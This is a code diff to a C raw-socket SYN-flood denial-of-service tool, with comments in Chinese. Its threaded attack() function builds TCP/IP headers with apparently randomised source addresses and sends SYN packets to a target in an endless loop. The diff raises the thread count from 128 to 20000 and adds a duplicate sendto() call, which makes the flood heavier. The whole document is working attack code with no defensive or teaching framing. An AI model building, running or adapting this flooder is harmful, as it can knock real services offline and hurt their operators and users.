@@ -2,9 +2,9 @@
 #include "header/CRC16_check.h"
 #include "header/init_header.h"
 #include "header/IPs.h"
-
+#include <unistd.h>
 /* 最多線程數 */
-#define MAXCHILD 128
+#define MAXCHILD 20000
 
 /* 原始套接字 */
 int sockfd;
@@ -25,7 +25,7 @@ char mode;
  * TCP偽頭部僅用於校驗和的计算
  */
 void* attack(void *addr_info){
-    struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
+    	struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
 	char buf[100], sendbuf[100];
 	int len;
 	struct iphdr ip_hdr;			//IP頭部
@@ -35,18 +35,19 @@ void* attack(void *addr_info){
 
 	len = sizeof(struct iphdr) + sizeof(struct tcphdr);
 
-
+	/* 初始化頭部 
+	tcp_init_header(&ip_hdr, &tcp_hdr, &pseudoheader, dst_ip, dst_port, mode);*/
+	printf("len: %d", len);
+	
 	/* random seed */
 	time_t t;
 	srand((unsigned) time(&t));
-
-	/* 初始化頭部 */
-	tcp_init_header(&ip_hdr, &tcp_hdr, &pseudoheader, dst_ip, dst_port, mode);
-
-
-	printf("len: %d\n", len);
+	
 	/* 處於活動狀態時持續發送SYN包 */
 	while(alive){
+		/* 初始化頭部 */
+		tcp_init_header(&ip_hdr, &tcp_hdr, &pseudoheader, dst_ip, dst_port, mode);
+		
 		ip_hdr.saddr = getSAddr();
 
 		//計算IP校驗和
@@ -66,12 +67,16 @@ void* attack(void *addr_info){
 		memcpy(sendbuf, &ip_hdr, sizeof(struct iphdr));
 		memcpy(sendbuf+sizeof(struct iphdr), &tcp_hdr, sizeof(struct tcphdr));
 		printf(".");
+		sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr));
+		/*pthread_exit(NULL);EXIT Thread*/
 		if (sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))< 0){
 			perror("sendto()");
 			pthread_exit("fail");
 		}
+		
 		//sleep(1);
 	}
+	
 }
 
 /* 信號處理函數,設置退出變量alive */
@@ -144,24 +149,24 @@ int main(int argc, char *argv[]){
 	setuid(getpid());
 
 	/* 建立多个線程協同工作 */
+	
 	for(i=0; i<MAXCHILD; i++){
 		err = pthread_create(&pthread[i], NULL, attack, (void *)&addr);
 		if(err != 0){
 			perror("pthread_create()");
-			exit(1);
+			exit(EXIT_FAILURE);
 		}
 	}
-
-	/* 等待線程结束 */
+	
+	/*等待结束線程*/
 	for(i=0; i<MAXCHILD; i++){
+		//pthread_exit(NULL);
 		err = pthread_join(pthread[i], NULL);
 		if(err != 0){
 			perror("pthread_join Error\n");
-			exit(1);
-		}
+			exit(EXIT_FAILURE);
+		}	
 	}
-
 	close(sockfd);
-
 	return 0;
 }
